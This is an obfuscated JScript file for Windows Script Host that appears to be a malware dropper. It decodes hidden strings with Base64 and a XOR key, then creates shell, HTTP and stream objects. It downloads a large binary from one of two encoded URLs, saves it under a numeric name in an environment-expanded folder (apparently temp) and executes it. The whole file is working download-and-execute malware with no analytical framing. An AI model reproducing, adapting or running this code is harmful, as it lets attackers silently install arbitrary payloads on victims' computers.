var decode = function (packedText) {
    var cipher ="cztGICbKpQmwpMnG";

    var Base64 = {
        _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",

        decode: function (input) {
            var output = "";
            var chr1, chr2, chr3;
            var enc1, enc2, enc3, enc4;
            var i = 0;

            input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

            while (i < input.length) {

                enc1 = this._keyStr.indexOf(input.charAt(i++));
                enc2 = this._keyStr.indexOf(input.charAt(i++));
                enc3 = this._keyStr.indexOf(input.charAt(i++));
                enc4 = this._keyStr.indexOf(input.charAt(i++));

                chr1 = (enc1 << 2) | (enc2 >> 4);
                chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
                chr3 = ((enc3 & 3) << 6) | enc4;

                output = output + String.fromCharCode(chr1);

                if (enc3 != 64) {
                    output = output + String.fromCharCode(chr2);
                }
                if (enc4 != 64) {
                    output = output + String.fromCharCode(chr3);
                }

            }

            output = Base64._utf8_decode(output);

            return output;

        },
        _utf8_decode: function (utftext) {
            var string = "";
            var i = 0;
            var c = c1 = c2 = 0;

            while (i < utftext.length) {

                c = utftext.charCodeAt(i);

                if (c < 128) {
                    string += String.fromCharCode(c);
                    i++;
                }
                else if ((c > 191) && (c < 224)) {
                    c2 = utftext.charCodeAt(i + 1);
                    string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                    i += 2;
                }
                else {
                    c2 = utftext.charCodeAt(i + 1);
                    c3 = utftext.charCodeAt(i + 2);
                    string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                    i += 3;
                }

            }
            return string;
        }
    };

    var text = Base64.decode(packedText);

    var cipherLength = cipher.length;
    var result = "";
    for (var i = 0; i < text.length; i++) {
        result += String.fromCharCode(text.charCodeAt(i) ^ cipher.charCodeAt(i % cipherLength));
    }
    return result;
};
(function() {
    var practicewYq = 200;
    var benightedngU = decode('"JD8g"');
    var resonantUcv = decode('"JgIRJA=="');
    var unimpeachableTXp = decode('"NCkXNSAzFmUjOQgbHA=="');
    var passebuO = decode('"LiksCgVxTBM9HSUjJB0="');
    var waivedUv = decode('"Ij47Aws="');
    var idiosyncrasyIgT = decode('"MA4GIigu"');
    var mootscw = decode('"Ri4xChlmPg=="');
    var confluenceThG = decode('"TR8MIg=="');
    var ventureB2I = 2e5;
    var aquilinexQB = [ decode('"Cw4AN3NsTSMVPQEYByIcKwcLBTZnIA0mX2ldWRU1Cw=="'), decode('"Cw4AN3NsTTwENwQEFyIHKQQSETUsJQRlEz4AWEh9QCIbHw=="') ];
    var unconscionablemqK = 524288;
    var convinceeWA = WScript.CreateObject(unimpeachableTXp);
    var nominalptW = WScript.CreateObject(passebuO);
    var scrutinizet5a = WScript.CreateObject(waivedUv + decode('"TQ=="') + idiosyncrasyIgT);
    var hirelingnwB = convinceeWA.ExpandEnvironmentStrings(mootscw);
    var larderNZx = hirelingnwB + unconscionablemqK + confluenceThG;
    var inditebI2 = false;
    for (var homespunjSC = 0; homespunjSC < aquilinexQB.length; homespunjSC++) {
        try {
            var homilyhL6 = aquilinexQB[homespunjSC];
            nominalptW.open(benightedngU, homilyhL6, false);
            nominalptW.send();
            if (nominalptW.status == practicewYq) {
                try {
                    scrutinizet5a.open();
                    scrutinizet5a.type = 1;
                    scrutinizet5a.write(nominalptW.responseBody);
                    if (scrutinizet5a.size > ventureB2I) {
                        homespunjSC = aquilinexQB.length;
                        scrutinizet5a.position = 0;
                        scrutinizet5a.saveToFile(larderNZx, 2);
                        inditebI2 = true;
                    }
                } finally {
                    scrutinizet5a.close();
                }
            }
        } catch (ignored) {}
    }
    if (inditebI2) {
        convinceeWA[resonantUcv](hirelingnwB + Math.pow(2, 19));
    }
})();